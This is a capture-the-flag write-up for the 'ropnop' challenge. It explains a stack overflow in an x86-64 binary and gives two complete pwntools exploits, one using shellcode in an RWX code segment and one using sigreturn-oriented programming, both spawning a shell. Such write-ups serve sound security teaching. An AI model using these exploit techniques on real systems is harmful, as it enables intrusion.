# ropnop

For this challenge we are given a linux `ELF` binary and it's source code:

```
$ file ropnop ropnop.c
ropnop:   ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked,
            interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, with debug_info, not stripped
ropnop.c: C source, ASCII text
```

`checksec` shows there is no stack canary:

```
$ checksec ropnop
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Let's try running it:

```
$ ./ropnop
[defusing returns] start: 0x55abd9e35000 - end: 0x55abd9e36375
abc
Segmentation fault
```

It prints something about defusing returns between two addresses, then we can enter some text and then it `segfaults`.

Let's have a look at the source code:

```cpp
int main(void) {
    init_buffering();
    ropnop();
    int* buffer = (int*)&buffer;
    read(0, buffer, 0x1337);
    return 0;
}
```

We can see that after disabling buffering the main function first calls `ropnop()` and then gives us a nice buffer overflow.

Let's take a look at `ropnop()`:

```cpp
extern unsigned char __executable_start;
extern unsigned char etext;

void ropnop() {
    unsigned char *start = &__executable_start;
    unsigned char *end = &etext;
    printf("[defusing returns] start: %p - end: %p\n", start, end);
    mprotect(start, end-start, PROT_READ|PROT_WRITE|PROT_EXEC);
    unsigned char *p = start;
    while (p != end) {
        // if we encounter a ret instruction, replace it with nop!
        if (*p == 0xc3)
            *p = 0x90;
        p++;
    }
}
```

It basically replaces all `ret` instructions in the loaded executable with a `nop`.
I guess the idea is that this will destroy all `rop` gadgets and make ropping impossible.

We even get a few nice gadgets taunting us:

```cpp
void gadget_shop() {
    // look at all these cool gadgets
    __asm__("syscall; ret");
    __asm__("pop %rax; ret");
    __asm__("pop %rdi; ret");
    __asm__("pop %rsi; ret");
    __asm__("pop %rdx; ret");
}
```

And inconveniently the `syscall` gadget is the first, so we can't just set up everything and `syscall` in one go.
These gadgets are practically useless.

Interestingly it looks like returning from `ropnop()` somehow still works.
The call to `read()` in `main` does get executed and we are prompted for input,
even though the `ret` instruction at the end of `ropnop()` should also get destroyed.

Let's run the binary in `gdb` and find out why that might be the case.
We can set a breakpoint in `ropnop()` at the point when a `ret` instruction is found:

```
pwndbg> disass ropnop
...
   0x000000000000126d <+109>:   movzx  ecx,BYTE PTR [rax]
   0x0000000000001270 <+112>:   cmp    ecx,0xc3                     ; ecx == ret?
   0x0000000000001276 <+118>:   jne    0x1283 <ropnop+131>          ; jump if not
   0x000000000000127c <+124>:   mov    rax,QWORD PTR [rbp-0x18]     ; if we reach this ecx == ret
...
pwndbg> b *ropnop+124
pwndbg> r
...
Breakpoint 1, 0x000055555555527c in ropnop ()
─────────────────────────────[ REGISTERS ]─────────────────────────────
RAX  0x55555555501a (_init+26) ◂— ret     /* 0x35ff0000000000c3 */
...
```

The address that is currently examined will be in `rax`.
Continuing for a while we can see all the places where a `ret` is destroyed.
At some point we find something interesting:

```
pwndbg> c
Continuing.

Breakpoint 1, 0x000055555555527c in ropnop ()
─────────────────────────────[ REGISTERS ]─────────────────────────────
 RAX  0x555555555272 (ropnop+114) ◂— ret     /* 0x7850f000000c3 */
...
pwndbg> disass ropnop
...
   0x0000555555555270 <+112>:   cmp    ecx,0xc3
   0x0000555555555276 <+118>:   jne    0x555555555283 <ropnop+131>
```

There isn't really a `ret` instruction at `ropnop+114` or at least not when the code gets executed normally.
Instead, this is the argument for the check if a byte is a `ret` instruction.
If this byte is also overwritten with a `nop` the function from now on doesn't check for `ret`'s anymore
and instead overwrites all `nop`'s with a `nop`.
Very useful.

This means all `ret` instructions after this point aren't changed and this also includes the `main` function.


## Exploit 1: The intended way?

Additionally, there is another fatal flaw in the code:

In order to overwrite the `ret` instructions, it first has to make the code segment writeable.
This is done by the call to `mprotect()` in `ropnop()`:

```cpp
mprotect(start, end-start, PROT_READ|PROT_WRITE|PROT_EXEC);
```

But after removing the `ret` instructions, the code segment is never changed back to read-only.
This means we might be able to write some shellcode into the binary and just run it.
It's like we are in pre-`NX` times again and don't even need any `rop`-gadgets.
We only need to find a way to write our shellcode into the binary.

There is a call to `read()` in `main`, so let's have a look at the disassembly and see what we can do:

```
pwndbg> disass main
<+0>:     push   rbp
<+1>:     mov    rbp,rsp
<+4>:     sub    rsp,0x20
<+8>:     mov    DWORD PTR [rbp-0x4],0x0
<+15>:    call   0x555555555170 <init_buffering>
<+20>:    call   0x555555555200 <ropnop>
<+25>:    xor    edi,edi
<+27>:    lea    rax,[rbp-0x10]
<+31>:    mov    QWORD PTR [rbp-0x10],rax
<+35>:    mov    rax,QWORD PTR [rbp-0x10]
<+39>:    mov    rsi,rax
<+42>:    mov    edx,0x1337
<+47>:    call   0x555555555040 <read@plt>
<+52>:    xor    ecx,ecx
<+54>:    mov    QWORD PTR [rbp-0x18],rax
<+58>:    mov    eax,ecx
<+60>:    add    rsp,0x20
<+64>:    pop    rbp
<+65>:    ret
```

The call to `read()` actually writes to `rbp-0x10` and conveniently the function ends with `pop rbp`.
This means we can just overwrite the saved `rbp` on the stack with our buffer overflow
and overwrite the return address to jump to `main+27` and write our shellcode to wherever we want.

We can then also jump to it if we put its address a bit further down so the `ret` on the second run jumps to it.

So we use the first call to `read()` to cause a buffer overflow and jump back into `main` on return.
This time the call to `read()` will write our shellcode into memory which will then get executed on the second return.

The only problem left now is how to find an address in the binary to write to.
Conveniently `ropnop()` tells us exactly that:

```
[defusing returns] start: 0x55abd9e35000 - end: 0x55abd9e36375
```

We can just place our exploit somewhere in the beginning of the binary.
We only need to set `rbp` to the address we want to jump to plus 16 (because we write to `rbp-0x10`)
and leave a bit of space before that because the function also accesses `[rbp-0x18]`.

The complete exploit now looks like this:

```python
#!/usr/bin/env python3

from pwn import *
import re

MAIN_TARGET_OFFSET = 0x5555555552bb - 0x555555554000

p = remote("hax1.allesctf.net", 9300)

leak = p.recvline()
bin_addr = int(re.findall(b"start: 0x(.*?) ", leak)[0], 16)

payload = b"A" * 16
payload += p64(bin_addr + 0x20)                 # rbp
payload += p64(bin_addr + MAIN_TARGET_OFFSET)   # ret addr 1 (back to read in main)
payload += cyclic_find(b"kaaa") * b"A"
payload += p64(bin_addr + 0x10)                 # ret addr 2 (shellcode)

p.send(payload)
sleep(1)

p.send(asm(shellcraft.amd64.linux.sh(), arch="amd64", os="linux"))
p.interactive()
```

And running it gives us the flag:

```
$ ./exploit.py
[+] Opening connection to hax1.allesctf.net on port 9300: Done
[*] Switching to interactive mode
$ cat flag
CSCG{s3lf_m0d1fy1ng_c0dez!}
```

Clearly, making a binary write- and executable isn't a good idea.

However, even if `ropnop()` would change the code segment back to read-only again the buffer overflow
together with the `syscall` "gadget" alone would still be enough to exploit this:

## Exploit 2: Who needs `RWX` anyways when we have `sigret`?

Even if we didn't have any write- and executable segments and almost no gadgets
we could still exploit this challenge using only the few `ret`'s we have left,
the `syscall` instruction and `sigreturn`-oriented programming.

The `sigreturn` syscall is usually used when the kernel returns control from a signal-handler
back to regular code and it resets all registers to their original values stored on the stack.

But we can use it to set up all the registers correctly for an `execve("/bin/sh", NULL, NULL)` syscall
by placing the values for the register on the stack.

To execute the `sigreturn` syscall we need to set `rax` to `15` (`sigreturn`'s syscall number)
and then execute a `syscall` instruction.
Unfortunately, `main` sets `rax` to `0` before returning but we can use a part of `ropnop()`
to set `rax` for us:

```
pwndbg> disass ropnop
...
   0x000000000000125b <+91>:    mov    rax,QWORD PTR [rbp-0x18]
   0x000000000000125f <+95>:    cmp    rax,QWORD PTR [rbp-0x10]
   0x0000000000001263 <+99>:    je     0x1296 <ropnop+150>
...
   0x0000000000001296 <+150>:   add    rsp,0x20
   0x000000000000129a <+154>:   pop    rbp
   0x000000000000129b <+155>:   ret
```

We just need a `15` at `[rbp-0x18]` and `[rbp-0x10]`.
We can easily control `rbp` but we still need a place to point it to
that contains two consecutive `15`'s.
Unfortunately, there doesn't seem to be such a place in the binary
but we can just create our own.
Remember that we can use the last part of `main` to write anywhere.
This time we assume that the code segment is read-only but the data-segment will still be write-able (but not executable).

So we can just
- overflow the "buffer" in main,
- point `rbp` somewhere into the data segment,
- jump back into `main` and write two `15`'s to `[rbp-0x10]`,
- increase `rbp` by `8` (again using the `pop rbp` at the end of `main`),
- jump into `ropnop` to set `rax` to `15`
- and then jump to the `syscall` instruction in the binary.

The `syscall` instruction will then execute `sigreturn` and
set all the registers to values we can specify on the stack.

We will
- set `rip` to the address of the `syscall` instruction again,
- set `rax` to `59` to execute the `execve` syscall,
- set `rsp` to somewhere in the data sagment so we have a valid stack,
- set `rdi` to a `"/bin/sh` string (we can just write one into the data segment as well),
- and set `rsi` and `rdx` to `0`.

This will now execute `execve("/bin/sh", NULL, NULL)` and give us a shell.

Here is the complete exploit code:

```python
#!/usr/bin/env python3

from pwn import *
import re

MAIN_TARGET_OFFSET = 0x5555555552bb - 0x555555554000
DATA_OFFSET = 0x4000
SYSCALL_OFFSET = 0x11e4
ROPNOP_RAX_OFFSET = 0x125b

SYS_SIGRETURN = 15
SYS_EXECVE = 59

p = remote("hax1.allesctf.net", 9300)

leak = p.recvline()
bin_addr = int(re.findall(b"start: 0x(.*?) ", leak)[0], 16)

payload = b"A" * 16
payload += p64(bin_addr + DATA_OFFSET + 0x20)   # rbp
payload += p64(bin_addr + MAIN_TARGET_OFFSET)   # ret addr 1 (back to read in main)
payload += b"A" * 0x20
payload += p64(bin_addr + DATA_OFFSET + 0x28)   # rbp
payload += p64(bin_addr + ROPNOP_RAX_OFFSET)    # ret addr 2 (set rax in ropnop)
payload += b"A" * 0x28
payload += p64(bin_addr + SYSCALL_OFFSET)       # ret addr 3 (syscall sys_sigreturn)

context.arch = "amd64"
frame = SigreturnFrame()
frame.rip = bin_addr + SYSCALL_OFFSET
frame.rsp = bin_addr + DATA_OFFSET + 0x100
frame.rax = SYS_EXECVE
frame.rdi = bin_addr + DATA_OFFSET + 0x20
frame.rsi = 0
frame.rdx = 0

payload += bytes(frame)

p.send(payload)
sleep(1)

p.send(p64(SYS_SIGRETURN) * 2 + b"/bin/sh\0")
p.interactive()
```

So maybe if you really don't want to get ropped and pwned you should just use a safer language like `Rust`.
